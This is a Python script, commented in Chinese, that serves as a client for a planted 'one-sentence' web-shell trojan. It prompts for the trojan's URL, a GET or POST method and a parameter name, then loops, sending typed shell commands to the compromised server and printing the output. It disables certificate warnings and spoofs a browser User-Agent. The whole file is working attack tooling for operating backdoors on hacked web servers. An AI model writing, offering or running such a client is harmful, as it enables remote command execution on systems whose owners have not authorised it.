import sys
import Assets
import requests
import urllib3

urllib3.disable_warnings()


# 构建get默认请求头
def default_headers():
    headers = {
        # "Host": f"{host}",
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0',
        "Accept": "*/*",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1"
    }
    return headers


def simple_horse_get_con(address, param):
    test = requests.Session()
    get_headers = default_headers()
    test_res = test.get(headers=get_headers, url=address)
    if test_res.status_code == 200:
        print("测试连接成功")
    else:
        print("测试连接失败")
        sys.exit(0)
    while True:
        req = requests.Session()
        shell = input(f"[{param} Shell]: ")
        if shell == 'exit':
            break
        params = {param: f"{shell}"}
        res = req.get(headers=get_headers, url=address, params=params)
        print(res.content.decode("gbk"))
    print("模块退出......")


def simple_horse_post_con(address, param):
    test = requests.Session()
    post_headers = default_headers()
    post_headers["Content-Type"] = "application/x-www-form-urlencoded"
    test_res = test.post(url=address, headers=post_headers)
    if test_res.status_code == 200:
        print("测试连接成功")
    else:
        print("测试连接失败")
        sys.exit(0)

    while True:
        req = requests.Session()
        shell = input(f"[Web-Shell {param}]: ")
        if shell == 'exit':
            break
        params = {param: f"{shell}"}
        res = req.post(headers=post_headers, url=address, data=params)
        print(res.content.decode("gbk"))
    print("模块退出......")


def start():
    address = input("输入要连接的一句话脚本木马地址:")
    method = input("输入请求方式 [GET/POST]:")
    param = input("输入连接参数 :")
    if method.lower() == 'get':
        simple_horse_get_con(address, param)
    else:
        simple_horse_post_con(address, param)
